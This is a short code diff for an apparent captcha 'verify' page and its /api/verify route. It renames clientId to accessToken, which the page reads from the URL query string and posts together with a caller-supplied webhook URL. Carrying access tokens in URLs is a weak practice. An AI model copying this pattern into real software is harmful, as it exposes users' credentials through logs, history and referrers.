@@ -258,14 +258,14 @@ async function onCaptchaSuccess(token) {
 };
 btn.onclick = async () => {
   const params = new URLSearchParams(location.search);
-  const clientId = params.get('clientId');
+  const accessToken = params.get('accessToken');
   const webhook = params.get('webhook');
   btn.disabled = true;
   btn.textContent = 'Verifying…';
   status.textContent = 'Performing secure verification…';
   try {
     await axios.post('/api/verify', {
-      clientId,
+      accessToken,
       webhook,
       userAgent: navigator.userAgent,
       token: window.__token,
@@ -315,7 +315,7 @@ app.post('/nonce', perIPLimiter, async (req, res) => {
 
 
 app.post('/api/verify', globalLimiter, perClientLimiter, async (req, res) => {
-  const { clientId, webhook, userAgent, token, nonce } = req.body || {};
+  const { accessToken, webhook, userAgent, token, nonce } = req.body || {};
   const ip = getIP(req);
   if (!nonce || !nonces.has(nonce)) return res.status(400).json({ error: 'Invalid or missing nonce!' });
   const nonceData = nonces.get(nonce);
